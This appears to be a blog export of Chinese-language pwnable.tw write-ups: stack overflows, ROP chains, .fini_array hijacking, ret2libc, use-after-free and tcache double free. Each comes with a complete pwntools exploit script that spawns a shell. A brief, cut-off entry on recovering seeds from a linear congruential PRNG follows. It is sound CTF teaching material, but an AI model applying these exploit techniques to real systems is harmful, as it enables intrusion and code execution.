    <content type="text"><![CDATA[简介最近因为保研的事情弄得自己心急气躁的，学习效率几乎为0。决定还是写篇博客找找学习的感觉，也自己立下个flag，争取每天都在pwntw刷一道题，好好学习下pwn。 摸了好久，从Xman刚回来，继续ing Start题目描述 Just a start.nc chall.pwnable.tw 10000 基本信息file检查一下，32位，动态链接 start0 checksec一下，没有任何保护 start2 ida打开如下： start1 解题思路F5出来之后的东西有点奇怪，所以直接看汇编 12345678910111213141516171819202122232425public _start_start proc nearpush esppush offset _exitxor eax, eaxxor ebx, ebxxor ecx, ecxxor edx, edxpush 3A465443hpush 20656874hpush 20747261hpush 74732073hpush 2774654Chmov ecx, esp ; addrmov dl, 14h ; lenmov bl, 1 ; fdmov al, 4int 80h ; LINUX - sys_writexor ebx, ebxmov dl, 3Chmov al, 3int 80h ; LINUX -add esp, 14hretn_start endp ; sp-analysis failed 程序逻辑大概就是首先将需要的参数传入寄存器，然后执行系统调用，根据这里的查找，可以确定第一个系统调用为sys_write start3 其中eax为系统调用参数，0x4便是sys_write。ebx为fd，这里是1。ecx为buf，这里为esp。edx为size，这里为0x14 这里就是将Let&#39;s start the CTF:这句话压入栈，然后通过sys_write打印到bash中 之后程序又将ebx置零，然后将edx改为0x3c，eax改为0x3。这里也就是代表捕获bash中的输入并且覆盖到esp上面去 start4 经过gdb调试，我发现也的确是这样的 start5 其中0xffffcdc8处也就是返回地址 那么这便是简单的栈溢出，由于没有开启nx，我们可以将shellcode写入栈上，然后控制返回地址到shellcode即可，其中偏移为20 但是由于我们的shellcode普遍大于20，那么我们写只能写在返回地址之后，shellcode可以在这里寻找 不过这里还有个问题便是如何获取栈地址，我注意到汇编代码中有这么一句 1mov ecx, esp ; addr 在retn的时候如果我们控制返回地址到这里，那么接下来程序便会将此时的esp打印出来，这样我们便可以获得当前的esp地址，然后便可以算出shellcode的位置 PS:这里需要注意不能用sendline函数，因为sendline会把当前的esp中的内容覆盖掉，这样就获取不了esp的值了 解题脚本123456789101112131415161718192021222324252627282930313233343536373839from pwn import *from pwnlib import gdbcontext.terminal = ['gnome-terminal','-x','sh','-c']context.log_level = 'debug'r = process('./start')gdb.attach(r)sd = lambda x : r.send(x)sl = lambda x : r.sendline(x)rv = lambda x = 2048 : r.recv(x)ru = lambda x : r.recvuntil(x)rl = lambda : r.recvline()ia = lambda : r.interactive()ra = lambda : r.recvall()sla = lambda x,y: r.sendlineafter(x,y)sa = lambda x,y : r.sendafter(x,y)offset = 20ru('Let\'s start the CTF:')write_addr = 0x08048087payload = 'A'*offset + p32(write_addr)sd(payload)esp_addr = u32(rv(4))print('[+]Esp_addr: '+hex(esp_addr))shellcode = asm('\n'.join([ 'push %d' % u32('/sh\0'), 'push %d' % u32('/bin'), 'xor edx, edx', 'xor ecx, ecx', 'mov ebx, esp', 'mov eax, 0xb', 'int 0x80',]))payload = 'A'*offset + p32(esp_addr+20) + shellcodesd(payload)ia() orw题目描述 Read the flag from /home/orw/flag.Only open read write syscall are allowed to use.nc chall.pwnable.tw 10001 基本信息file检查一下，32位，动态链接 orw0 checksec一下，开启了Canary和Part relro orw1 ida打开如下： orw2 解题思路正如题目表述的那样，我们只能使用open/read/write三个syscall，限制他们的也正是orw_seccomp函数 orw3 那么思路也很清楚，open打开flag文件，read读取文件，write打印文件内容 首先我们看open函数，eax为0x5；ebx为文件名；ecx为flags，也就是open的第二个参数；edx为mode；在执行了open之后，fd便存储在eax orw4 那么我们可以这样编写shellcode 123456789# fd = open(&apos;/home/orw/flag&apos;,0)mov ecx,0mov eax,SYS_opencall here.string &quot;/home/orw/flag&quot;.byte 0here:pop ebxint 0x80 然后我们看read函数，eax为0x3；ebx为fd，也就是open之后的eax；ecx为buf；edx为count，也就是size orw5 vmmap看一下，bss段可读可写可执行，我们可以把文件内容写入bss段 orw6 那么我们可以这样编写shellcode 123456# read(fd,bss+0x40,0x40)mov ebx,eaxmov eax,SYS_readmov ecx,0x0804A100mov edx,0x40int 0x80 最后我们看write函数，eax为0x4，ebx为fd，输出到屏幕就是1；ecx为buf；edx为vien，也就是size orw7 那么我们可以这样编写shellcode 123456#write(1,bss+0x40,0x40)mov ebx,0x1mov eax,SYS_writemov ecx,0x0804A100mov edx,0x40int 0x80 解题脚本123456789101112131415161718192021222324252627282930313233343536373839from pwn import *# r = process('./orw')r = remote('chall.pwnable.tw', 10001)sd = lambda x : r.send(x)sl = lambda x : r.sendline(x)rv = lambda x = 2048 : r.recv(x)ru = lambda x : r.recvuntil(x)rl = lambda : r.recvline()ia = lambda : r.interactive()ra = lambda : r.recvall()sla = lambda x,y: r.sendlineafter(x,y)sa = lambda x,y : r.sendafter(x,y)ru('shellcode:')code = ''' mov ecx,0 mov eax,SYS_open call here .string "/home/orw/flag" .byte 0 here: pop ebx int 0x80 mov ebx,eax mov eax,SYS_read mov ecx,0x0804A100 mov edx,0x40 int 0x80 mov ebx,0x1 mov eax,SYS_write mov ecx,0x0804A100 mov edx,0x40 int 0x80 '''shellcode=asm(code,arch="i386")sd(shellcode)ia() calc题目描述 Have you ever use Microsoft calculator?nc chall.pwnable.tw 10100 基本信息file检查一下，32位，静态链接 calc0 checksec一下，开启了Canary，NX和Part relro calc1 ida打开如下： calc2 calc3 calc4 calc5 calc6 calc7 calc8 解题思路首先在get_expr中，限制了我们的输入为+-*/%0-9，get_expr会逐个读入字符并在最后添加一个\x00 然后init_pool中会初始化长度为100的数组，全部赋值为0 我们重点看parse_expr函数 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182signed int __cdecl parse_expr(int input, _DWORD *pool)&#123; unsigned int v2; // ST2C_4 int count; // eax _BYTE *byte_input; // [esp+20h] [ebp-88h] int i; // [esp+24h] [ebp-84h] int v7; // [esp+28h] [ebp-80h] char *s1; // [esp+30h] [ebp-78h] int v9; // [esp+34h] [ebp-74h] char operate[100]; // [esp+38h] [ebp-70h] unsigned int v11; // [esp+9Ch] [ebp-Ch] v11 = __readgsdword(0x14u); byte_input = (_BYTE *)input; v7 = 0; bzero(operate, 0x64u); for ( i = 0; ; ++i ) &#123; if ( (unsigned int)(*(char *)(i + input) - '0') &gt; 9 )// 为运算符的时候 &#123; v2 = i + input - (_DWORD)byte_input; // 左操作数的长度 s1 = (char *)malloc(v2 + 1); memcpy(s1, byte_input, v2); // 从byte_input处copy长度为v2的字符串到s1 s1[v2] = 0; if ( !strcmp(s1, "0") ) // 左操作数不能为0 &#123; puts("prevent division by zero"); fflush(stdout); return 0; &#125; v9 = atoi((int)s1); // str2int if ( v9 &gt; 0 ) &#123; count = (*pool)++; // pool[0]保存的是操作数的个数 pool[count + 1] = v9; &#125; if ( *(_BYTE *)(i + input) &amp;&amp; (unsigned int)(*(char *)(i + 1 + input) - 48) &gt; 9 )// 对后一个字符做判断，判断是否都是运算符 &#123; puts("expression error!"); fflush(stdout); return 0; &#125; byte_input = (_BYTE *)(i + 1 + input); if ( operate[v7] ) &#123; switch ( *(char *)(i + input) ) &#123; case 37: // % case 42: // * case 47: // / if ( operate[v7] != 43 &amp;&amp; operate[v7] != 45 )// + - &#123; eval(pool, operate[v7]); operate[v7] = *(_BYTE *)(i + input); &#125; else &#123; operate[++v7] = *(_BYTE *)(i + input); &#125; break; case 43: case 45: eval(pool, operate[v7]); operate[v7] = *(_BYTE *)(i + input); break; default: eval(pool, operate[v7--]); break; &#125; &#125; else &#123; operate[v7] = *(_BYTE *)(i + input); &#125; if ( !*(_BYTE *)(i + input) ) break; &#125; &#125; while ( v7 &gt;= 0 ) eval(pool, operate[v7--]); return 1;&#125; 以及eval函数 123456789101112131415161718192021222324252627_DWORD *__cdecl eval(_DWORD *pool, char s)&#123; _DWORD *result; // eax if ( s == '+' ) &#123; pool[*pool - 1] += pool[*pool]; &#125; else if ( s &gt; '+' ) &#123; if ( s == '-' ) &#123; pool[*pool - 1] -= pool[*pool]; &#125; else if ( s == '/' ) &#123; pool[*pool - 1] /= pool[*pool]; &#125; &#125; else if ( s == '*' ) &#123; pool[*pool - 1] *= pool[*pool]; &#125; result = pool; --*pool; return result;&#125; 在这里有个最主要的问题是pool[0]存放的是操作数的个数，pool其余的地方存放操作数，s存储运算符那么如果我们输入+10，这时候按照这个逻辑来说就会有个神奇的事情 pool[0] = 1, pool[1] = 10pool[0] += pool[1] = 11–*pool = 10最终的输出结果就是pool[10] 类似地，我们输入+10+1，会导致 pool[10] += 1 这样我们就可以实现栈上任意写 又由于 int pool; // [esp+18h] [ebp-5A0h] 我们可以得到0x5a0/4 = 360，即pool[360]为ebp，pool[361]为返回地址，那么我们只要修改pool[361]即可 由于程序为静态链接，又开启了nx，则我们只能通过ROP执行execve(&#39;/bin/sh&#39;)，所以我们需要用ROPgadget寻找gadget pop_ret_eax = 0x0805c34bpop_ret_ecx_ebx = 0x080701d1pop_ret_edx = 0x080701aaint80 = 0x08049a21 但是没有/bin/sh的字符串，所以要我们自己放上去，然后传入地址，即可getshell 解题脚本需要注意的是，解题脚本中的main_stack_size有可能为8和24，当24的时候才是对的，也不知道为什么那么神奇 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071from pwn import *context.log_level = &apos;debug&apos;HOST = &apos;chall.pwnable.tw&apos;PORT = 10100# r = process(&apos;./calc&apos;)r = remote(HOST,PORT)sd = lambda x : r.send(x)sl = lambda x : r.sendline(x)rv = lambda x = 2048 : r.recv(x)ru = lambda x : r.recvuntil(x)rl = lambda : r.recvline()ia = lambda : r.interactive()ra = lambda : r.recvall()sla = lambda x,y: r.sendlineafter(x,y)sa = lambda x,y : r.sendafter(x,y)ret_index = 361main_ebp_index = 360pop_ret_eax = 0x0805c34bpop_ret_ecx_ebx = 0x080701d1pop_ret_edx = 0x080701aaint80 = 0x08049a21eax = 11ecx = 0edx = 0ru(&apos;=== Welcome to SECPROG calculator ===&apos;)# Get main_ebp addrsl(&apos;+&apos;+str(main_ebp_index))ru(&apos;\n&apos;)main_ebp = int(ru(&apos;\n&apos;)[:-1])print &apos;Main_ebp_addr: &apos; + hex(main_ebp)# Get /bin/sh addrmain_stack_size = (main_ebp + 0x100000000) - ((main_ebp + 0x100000000) &amp; 0xFFFFFFF0-16)print &apos;Main_stack_size: &apos; + str(main_stack_size)bin_sh_addr = main_ebp + (8-main_stack_size/4-1)*4print &apos;Bin_sh_addr: &apos; + hex(bin_sh_addr)pause()# Writedef write(index,value): idx = ret_index+index payload = &apos;+&apos; + str(idx) sl(payload) base_value = int(ru(&apos;\n&apos;)[:-1]) diff = value - base_value if diff &lt; 0: payload = &apos;+&apos; + str(idx) + str(diff) sl(payload) else: payload = &apos;+&apos; + str(idx) + &apos;+&apos; + str(diff) sl(payload) after_value = int(ru(&apos;\n&apos;)[:-1]) print &apos;Before: &apos; + str(base_value) print &apos;Target: &apos; + str(value) print &apos;Diff: &apos; + str(diff) print &apos;After: &apos; + hex(after_value) pause()key = [pop_ret_eax,eax,pop_ret_edx,edx,pop_ret_ecx_ebx,ecx,bin_sh_addr,int80,0x6e69622f,0x0068732f] for i in range(len(key)): write(i,key[i])sl(&apos;pwn&apos;)ia() 3x17题目描述 3 x 17 = ?nc chall.pwnable.tw 10105 基本信息file检查一下，64位，动态链接 3x170 checksec一下，开启了NX和Part relro，并且ida打开发现是有Canary的 3x171 ida打开如下： 3x172 解题思路 本思路摘抄于该博客 首先由于没有符号表，我们直接看start，发现 12345.text:0000000000401A5F mov r8, offset sub_402960.text:0000000000401A66 mov rcx, offset loc_4028D0.text:0000000000401A6D mov rdi, offset sub_401B6D.text:0000000000401A74 db 67h.text:0000000000401A74 call sub_401EB0 所以__libc_start_main的函数原型： __libc_start_main(main,argc,argv&amp;env,init,fini,rtld_fini) 对应为: 1234sub_401B6D: mainsub_402960: finisub_401EB0: __libc_start_mainloc_4028D0：init 然后sub_40EE7也就是strtol函数，如果我们输入一个十进制的字符串，它会将该字符串转为int并存储在eax中 这道题的逻辑调一下就会发现是任意地址写0x18个字节，并且有一个变量byte_4B9330，每次任意写会自增，只有当它为1时才能写 上面我们也提到，__libc_start_main的两个参数init,fini 也就是__libc_csu_fini（sub_402960），__libc_csu_init（loc_4028D0） 其中csu为 C start up 那么init就是开始的函数，fini就是结束的函数 在IDA的 view -&gt; open subviews -&gt; segments中，我们可以看见四个段: .init.init_array.fini.fini_array 3x173 其中.init和.fini点进去是函数，.init_array和.fini_array点进去是数组 而且我们有: __libc_csu_init执行.init和.init_array__libc_csu_fini执行.fini和.fini_array 并且执行顺序为 __libc_csu_initmain__libc_csu_fini 进一步说，为 .init.init_array[0].init_array[1]….init_array[n]main.fini_array[n]….fini_array[1].fini_array[0].fini 所以如果我们将.fini_array[1]覆盖为main，.fini_array[0]覆盖为__libc_csu_fini的时候，我们就可以一直循环写了 而且由于变量byte_4B9330为byte类型，则它可以溢出重新回到1，然后我们可以继续写，即它并无任何影响 则首先实现无限任意写: 12345678910111213141516171819202122232425262728from pwn import *context.log_level = 'debug'r = process('./3x17')sd = lambda x : r.send(x)sl = lambda x : r.sendline(x)rv = lambda x = 2048 : r.recv(x)ru = lambda x : r.recvuntil(x)rl = lambda : r.recvline()ia = lambda : r.interactive()ra = lambda : r.recvall()sla = lambda x,y: r.sendlineafter(x,y)sa = lambda x,y : r.sendafter(x,y)main_addr = 0x401B6Dfini_addr = 0x402960fini_array_addr = 0x4B40F0def write(addr,value): ru('addr:') sl(str(addr)) ru('data:') sl(str(value))payload = p64(fini_addr) + p64(main_addr)write(fini_array_addr,payload)ia() 然后我们需要自己写shellcode或者ROP，但是我们不知道栈地址，所以我们需要利用点技巧 我们看到 1234.text:0000000000402960 push rbp.text:0000000000402961 lea rax, unk_4B4100.text:0000000000402968 lea rbp, off_4B40F0.text:0000000000402988 call qword ptr [rbp+rbx*8+0] 其中off_4B40F0为.fini_array，[rbp+rbx*8+0]指向fini_array的函数，其中rbp的值先是被压入了栈中，然后将定值0x4b40f0赋给了rbp 那么如果我们把函数劫持到一个地方，满足下面的条件: 123456lea rbp, off_4B40F0 ; rbp = 0x4b40f0 , rsp = 未知; 劫持到这mov rsp,rbp ; rbp = 0x4b40f0 , rsp = 0x4b40f0pop rbp ; rbp = [rsp] = [0x4b40f0] , rsp = 0x4b40f8ret ; rip = [rsp] = [0x4b40f8] , rsp = 0x4b4100 则rsp被劫持到0x4b4100，rip和rbp分别为.fini_array[1]和.fini_array[0]的内容： 12345678910111213141516171819202122232425low addr 0x4b40f0 +----------------+ | | | | | .fini_array[0] | | (rbp) | | | 0x4b40f8 +----------------+ | | | | | .fini_array[1] | | (rip) | | | rsp +----&gt; 0x4b4100 +----------------+ +-+ | | | | + | | | | | | | .data.rel.ro | | rop chain | (read/write) | | | | | | | | | | | | | v | | high addr +----------------- +-+ 那么我们只需要 1231.布置好从0x4b4100开始的栈空间(利用任意地址写)2.保证.fini_array[1]指向的代码不破坏栈结构，还有个ret，或者直接就一句ret也行3.通过上文类似的方法劫持rsp到0x4b4100，即可触发ROP 对于第一点，我们可以用ROPgadget来布置0x4b4100开始的栈空间 对于第二点，由于我们的.fini_array[1]为main·，并不破坏栈结构，所以不用修改 对于第三点，由于main函数最后有leave;retn;，其中leave相当于mov rsp,rbp;pop rbp，那么我们只需要把.fini_array改为该地址即可 需要注意的是，64位的execve应满足 首先查到execve在64位的上的系统调用号是0x3b，所以要控制rax为0x3b控制rdi为’/bin/sh\x00’的地址控制rsi和rdx均为064位下系统调用的指令为syscall而不是int 80 解题脚本12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152from pwn import *context.log_level = 'debug'# r = process('./3x17')r = remote("chall.pwnable.tw",10105)sd = lambda x : r.send(x)sl = lambda x : r.sendline(x)rv = lambda x = 2048 : r.recv(x)ru = lambda x : r.recvuntil(x)rl = lambda : r.recvline()ia = lambda : r.interactive()ra = lambda : r.recvall()sla = lambda x,y: r.sendlineafter(x,y)sa = lambda x,y : r.sendafter(x,y)main_addr = 0x401B6Dfini_addr = 0x402960fini_array_addr = 0x4B40F0leave_ret_addr = 0x401C4Besp = 0x4B4100def write(addr,value): ru('addr:') sd(str(addr)) ru('data:') sd(str(value))# Get write timeswrite(fini_array_addr,p64(fini_addr) + p64(main_addr))# ROPpop_ret_rax = 0x41e4afpop_ret_rdi = 0x401696pop_ret_rdx = 0x446e35pop_ret_rsi = 0x406c30syscall = 0x4022b4bin_sh_addr = 0x4B45C0write(bin_sh_addr,"/bin/sh\x00")key = [pop_ret_rax,0x3b,pop_ret_rdi,bin_sh_addr ,pop_ret_rdx,0,pop_ret_rsi,0,syscall]for i in range(len(key)): write(esp+i*8,p64(key[i]))# Get shellwrite(fini_array_addr,p64(leave_ret_addr))ia() dubblesort题目描述 Sort the memory!nc chall.pwnable.tw 10101 基本信息file检查一下，32位，动态链接 dubblesort0 checksec一下，保护全开 dubblesort1 ida打开如下： dubblesort2 解题思路题目输入名字处如果输入回车则会泄露处canary（需要注意的是接收字节的时候需要把最后的0a改为00） 并且由于输入的排序的数字的个数没有限制，因此我们也就可以改栈上的数据 如果在输入数字的时候输入别的字符，例如s，则这个位置之后的数据都不会被修改，但是会被打印出来 如果我们输入的数字为+/-，则栈上的数据不会改变 由于我们有libc，则我们可以用ret2libc来getshell 我们发现，在name后24个字节处有一个疑似libc中的地址0xf7f9800a dubblesort3 之后vmmap查看libc的起始地址，发现为0xf7dc0000 dubblesort4 那么偏移就为0xf7f9800a-0xf7dc0000=0x1d8000，我们用readelf查看本地的libc也可以发现是这个偏移 dubblesort5 由于题目给了libc，我们查看之后发现偏移不太一样，偏移为0x1b0000，之后我们利用的时候要小心 dubblesort6 解题脚本有时候会失败应该是canary比sys_addr大导致的，多试试就行了 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768from pwn import *context.log_level = 'debug'HOST = "chall.pwnable.tw"PORT = 10101# r = process('./dubblesort')r = remote(HOST,PORT)libc = ELF('libc_32.so.6')sd = lambda x : r.send(x)sl = lambda x : r.sendline(x)rv = lambda x = 2048 : r.recv(x)ru = lambda x : r.recvuntil(x)rl = lambda : r.recvline()ia = lambda : r.interactive()ra = lambda : r.recvall()sla = lambda x,y: r.sendlineafter(x,y)sa = lambda x,y : r.sendafter(x,y)offset = 0x18libc_offset = 0x1b0000local_offset = 0x1d8000def write(value): ru('number :') sl(value)# Get libc_baseru('name :')payload = 'a'*24sl(payload)ru('Hello ')ru(payload)libc_base = (u32(rv(4)) ^ 0xa ) libc_base -= libc_offsetprint '[+]Get libc_base: '+hex(libc_base)# Get sys_addr and bin_sh_addrlibc.address = libc_basesys_addr = libc.symbols['system']bin_sh_addr = next(libc.search('/bin/sh'))print '[+]Get sys_addr: '+hex(sys_addr)print '[+]Get bin_sh_addr: '+hex(bin_sh_addr)# Write lenru('sort :')sl('35')# Write paddingfor i in range(offset): write('1')# Write canarywrite('+')# Write sys_addrfor i in range(9): write(str(sys_addr))# Write bin_sh_addrwrite(str(bin_sh_addr))ia() hacknote题目描述 A good Hacker should always take good notes!nc chall.pwnable.tw 10102 基本信息file检查一下，32位，动态链接，开了cannary，NX和Partial RELRO，没开PIE hacknote0 题目是个堆题，有add，delete和print hacknote1 add可以是任意大小，最多五个chunk hacknote2 delete中free后没有把指针置空，结合print就是UAF hacknote3 hacknote4 解题思路由于add一次会增加一个0x20和指定大小+0x10的堆块，所以可以申请两个大于0x10的堆块 然后free掉，再申请个0x10的堆块，造成UAF，申请的时候填入atoi的got表地址，泄露libc 最后用同样的方法system(‘||sh’)即可 解题脚本123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657from pwnlib import gdbfrom pwn import *context.log_level = 'debug'p = './hacknote'#r = process(p)r = remote('chall.pwnable.tw',10102)elf = ELF(p)libc = ELF('./libc_32.so.6')#libc = ELF('/lib/i386-linux-gnu/libc.so.6')def cmd(idx): r.recvuntil('Your choice :') r.send(str(idx))def add(size,data): cmd(1) r.recvuntil('Note size :') r.send(str(size)) r.recvuntil('Content :') r.send(data)def free(idx): cmd(2) r.recvuntil('Index :') r.send(str(idx))def show(idx): cmd(3) r.recvuntil('Index :') r.send(str(idx))ptr = 0x804A050add(0x80,'a'*0x80)add(0x80,'b'*0x80)add(0x80,'c'*0x80)atoi()free(2)free(0)atoi_got = elf.got['atoi']add(0x8,p32(0x0804862b) + p32(atoi_got))show(2)libc_base = u32(r.recvuntil('\x0a',drop=True)[:4]) - libc.symbols['atoi']system = libc_base + libc.symbols['system']success('libc_base: ' + hex(libc_base))free(1)free(0)add(0x8,p32(system)+'||sh')show(2)#gdb.attach(r)r.interactive() Silver Bullet题目描述 Please kill the werewolf with silver bullet!nc chall.pwnable.tw 10103 基本信息file检查一下，32位，动态链接，开了NX和Full RELRO silver_bullet0 题目是个栈题，三个选项 silver_bullet1 选项1是create_bullet，添加不超过0x30的数据，其中数据长度会保存在数据的后面，都在栈上，且后面就是ebp和返回地址 silver_bullet2 选项2是power_up，其中的strncat中存在漏洞，因为它会将字符串拼接在源字符串之后，然后再加一个\x00，从而修改了长度，使得我们可以再次调用选项2劫持返回地址 silver_bullet3 选项3是beat，也就是当数据长度大于一定值的时候，程序便会退出 silver_bullet4 解题思路首先create长度位0x2f的数据，然后power_up一个字节，这样下一次便可以覆盖返回地址 先将返回地址改为puts的plt表，传入参数puts的got表的地址便可泄露libc 然后将程序控制回main，再执行一次，用同样的方法控制程序返回system，从而getshell 解题脚本12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667from pwnlib import gdbfrom pwn import *context.log_level = 'debug'#r = process('./silver_bullet')elf = ELF('./silver_bullet')#libc = ELF('/lib/i386-linux-gnu/libc.so.6')r = remote('chall.pwnable.tw', 10103)libc = ELF('./libc_32.so.6')def cmd(idx): r.recvuntil('Your choice :') r.sendline(str(idx))def new(data): cmd(1) r.recvuntil('Give me your description of bullet :') r.sendline(data)def add(data): cmd(2) r.recvuntil('Give me your another description of bullet :') r.sendline(data)def beat(): cmd(3)new('1'*0x2f)add('1')puts_plt = elf.plt['puts']puts_got = elf.got['puts']main = elf.symbols["main"]payload = '\xff'*7payload += p32(puts_plt)payload += p32(main)payload += p32(puts_got)add('\x00'*4+'1234')#gdb.attach(r,'b *0x08048954')add(payload)beat()r.recvuntil('Oh ! You win !!\x0a')libc_base = u32(r.recvuntil('\x0a',drop=True)) - libc.symbols['puts']success('libc_base: '+ hex(libc_base))system = libc_base + libc.symbols['system']bin_sh = libc_base + libc.search('/bin/sh').next()new('1'*0x2f)add('1')payload = '\xff'*7payload += p32(system)payload += p32(main)payload += p32(bin_sh)add(payload)beat()r.interactive() applestore题目描述 tomcr00se rooted the galaxy S5, but we need you to jailbreak the iPhone8!nc chall.pwnable.tw 10104 基本信息file检查一下，32位，动态链接，开了Canary，NX和Partial RELRO applestore0 题目看似是个堆题，实际上是个栈题 applestore1 选项1是list，可以列出当前store的商品 applestore2 选项2是add，可以添加商品到myCart中，其中myCart是一个双向列表，连接着各个商品 applestore3 applestore4 applestore5 选项3是delete，将指定的商品从myCart中拿去，类似于unlink applestore6 选项4是cart，可以遍历myCart链表并打印出各个商品的价格 applestore7 选项5是checkout，当商品总价为0x1C06时，在myCart末端添加一个iPhone 8，该结构体位于栈上 applestore8 结构体如下 123456struct Phone&#123; char *name; int price; struct Phone *fd; struct Phone *bk;&#125; 解题思路该题有几个知识点： 1.atoi只会转换数字，但是如果你输入别的东西，也会把这些东西放在栈上，且\x00也是可以放上去的 2.libc中有一个东西叫environ，是栈上的一个地址，debug出来是一开始的ebp applestore9 3.栈劫持可以控制程序流 解题思路如下： 1.add出6个iPhone 6和20个iPhone 6 plus，调用checkout将iPhone 8加入myCart 2.利用atoi覆盖iPhone 8结构体，使得name指向puts的got表处，fd置0，bk指向一个可写区域，这样就可以通过delete泄露libc，然后让unlink失效，即我们的myCard链表尾还是该结构体 3.利用栈劫持，用handler里面的nptr的地址覆盖handler的ebp，通过delete触发unlink，使得程序从handler退出后esp指向nptr 4.最后布置nptr调用system(‘sh’)即可 解题脚本12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091from pwnlib import gdbfrom pwn import *context.log_level = 'debug'p = './applestore'#r = process(p)r = remote('chall.pwnable.tw',10104)elf = ELF(p)#libc = ELF('/lib/i386-linux-gnu/libc.so.6')libc = ELF('./libc_32.so.6')def cmd(idx): r.recvuntil('&gt; ') r.send(str(idx))def add(idx): cmd(2) r.recvuntil('Device Number&gt; ') r.sendline(str(idx))def free(idx): cmd(3) r.recvuntil('Item Number&gt; ') r.sendline(str(idx))def list(choice): cmd(4) r.recvuntil('Let me check your cart. ok? (y/n) &gt;') r.sendline(choice)def checkout(choice): cmd(5) r.recvuntil('Let me check your cart. ok? (y/n) &gt; ') r.sendline(choice)for _ in range(6): add(1)for _ in range(20): add(2)checkout('y')puts_got = elf.got['puts']puts_libc = libc.symbols['puts']bss = elf.bss(0x100) payload = '27'payload += p32(puts_got)payload += '\x00'*8payload += p32(bss)free(payload)r.recvuntil('Remove 27:')libc_base = u32(r.recv(4)) - puts_libcsuccess('libc_base: ' + hex(libc_base))system = libc_base + libc.symbols['system']environ = libc_base + libc.symbols['environ']payload = '27'payload += p32(environ)payload += '\x00'*12free(payload)r.recvuntil('Remove 27:')stack_base = u32(r.recv(4))ebp = stack_base - 0xc4stack = stack_base - 0xe4bin_sh = libc_base + libc.search('sh\x00').next()payload = '27'payload += p32(0)payload += p32(0xdeadbeef)payload += p32(stack)payload += p32(ebp-8)free(payload)payload = '06'payload += p32(0xdeadbeef) #ebppayload += p32(system) #target_functionpayload += p32(stack) #ret_addrpayload += p32(bin_sh) #bin_sh#gdb.attach(r,'b *0x08048C31')cmd(payload)r.interactive() Tcache Tear题目描述 Make tcache great again !nc chall.pwnable.tw 10207 基本信息file检查一下，32位，动态链接，除了PIE全开，libc2.27 tcache_tear0 题目是个堆题，有add，free和show tcache_tear1 选项1是add，可以add任意个size小于0xff的chunk，且读入的数据是size-0x10，该参数在my_read中是无符号的，意味着我们如果输入的size小于0x10，则可以输入远大于size的数据，造成堆溢出 tcache_tear2 tcache_tear6 选项2是delete，删除ptr指针所指向的chunk且未置空 tcache_tear3 选项3是show，将bss段上的name区域的东西打印出来 tcache_tear4 可以看到bss段上name和ptr挨在一起 tcache_tear5 解题思路1.tcache的double free任意写到bss段上name-0x10+0x600处，构造伪造的chunk 2.再double free一次任意写到name-0x10处伪造0x600的chunk，并且修改ptr，使得下次free可以free到我们伪造在name的chunk 3.free之后将伪造的chunk放入unsorted bin，此时用show就可以泄露libc地址，进而写free_hook为one_gadget来getshell 解题脚本123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778from pwnlib import gdbfrom pwn import *context.terminal = ['gnome-terminal','-x','sh','-c']context.log_level = 'debug'p = './tcache_tear'#r = process(p,aslr=True)r = remote('chall.pwnable.tw',10207)elf = ELF(p)libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')def welcome(name): r.recvuntil('Name:') r.sendline(name)def cmd(idx): r.recvuntil('Your choice :') r.send(str(idx))def add(size,data): cmd(1) r.recvuntil('Size:') r.sendline(str(size)) r.recvuntil('Data:') r.send(data)def free(): cmd(2)def show(): cmd(3)name = 0x602060ptr = 0x602088stdout = 0x602020welcome('ver')add(0x70,'1')free()free()add(0x70,p64(name-0x10+0x600))add(0x70,'2')add(0x70,p64(0)+p64(0x21)+p64(0)*3+p64(0x21))add(0x60,'3')free()free()add(0x60,p64(name-0x10))add(0x60,'4')add(0x60,p64(0)+p64(0x601)+p64(0)*5+p64(name))free()show()r.recvuntil('Name :')libc_base = u64(r.recv(8)) - 0x3ebca0success('libc_base: ' + hex(libc_base))free_hook = libc_base + libc.symbols['__free_hook']one_gadget = libc_base + 0x4f322add(0x50,'5')free()free()add(0x50,p64(free_hook))add(0x50,'6')add(0x50,p64(one_gadget))free()#gdb.attach(r)r.interactive()]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Random attack]]></title>
    <url>%2F2019%2F08%2F19%2FRandom-attack%2F</url>
    <content type="text"><![CDATA[简介今天有幸拜读了bibi大佬在xman上讲的密码学的ppt，感觉收获很多。在序列密码这一章里学到了很多有关随机数的攻击方法，今天抽空记录一下。另外发现了一篇大佬写的不错的blog，也一并摘抄整合一下。(如有不妥请联系我进行删除,谢谢！verhan@163.com) Level 1: Linear Congruential PRNGBasic knowledge java.util.Random, elder c’s rand(), some of platform’s php’s rand()48 bits seed as internal initial stateLinear: next_state = (state * multiplier + addend) mod (2 ^ precision) multiplier = 25214903917 addend = 11 Precision = 48State -&gt; output: bitshifted to the right by 16 bitsnextInt(), nextLong(), …… – 32 bits or multiple Attack12345678910Random random = new Random();long v1 = random.nextInt();long v2 = random.nextInt();for (int i = 0; i &lt; 65536; i++) &#123; long state = v1 * 65536 + i; if (((state * multiplier + addend) &amp; mask) &gt;&gt;&gt; 16) == v2) &#123; System.out.println("Seed found: " + state); break; &#125;&#125; Jarvis OJ [xman2019]mediumrpd服务器端代码1234567891011121314151617181920212223242526272829303132class Unbuffered(object): def __init__(self, stream): self.stream = stream def write(self, data): self.stream.write(data) self.stream.flush() def __getattr__(self, attr): return getattr(self.stream, attr)import syssys.stdout = Unbuffered(sys.stdout)import signalsignal.alarm(600)import osos.chdir("/root/level1")flag=open("flag","r").read()import subprocesso = subprocess.check_output(["java", "Main"])tmp=[]for i in o.split("\n")[0:3]: tmp.append(int(i.strip()))v1=tmp[0] % 0xffffffffv2=tmp[1] % 0xffffffffv3=tmp[2] % 0xffffffffprint v1print 